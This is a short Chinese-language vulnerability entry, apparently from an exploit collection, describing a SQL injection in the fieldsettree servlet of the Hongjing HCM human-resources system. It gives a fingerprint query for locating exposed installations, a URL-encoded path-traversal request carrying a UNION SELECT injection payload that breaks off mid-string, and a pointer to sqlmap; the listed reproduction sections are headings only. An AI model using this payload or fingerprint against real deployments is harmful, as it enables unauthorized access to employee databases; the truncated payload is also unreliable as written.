# 宏景人力资源信息管理系统fieldsettree存在SQL注入漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1%27%20UNION%20ALL%20SELECT%2018%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28SYSDATETIME%28%29%3DSYSDATETIME%28%29%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCH`

**请求体 / payload**
```

sqlmap
GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1 HTTP/1.1
Host:
```

**其他**
- 宏景人力资源信息管理系统fieldsettree存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统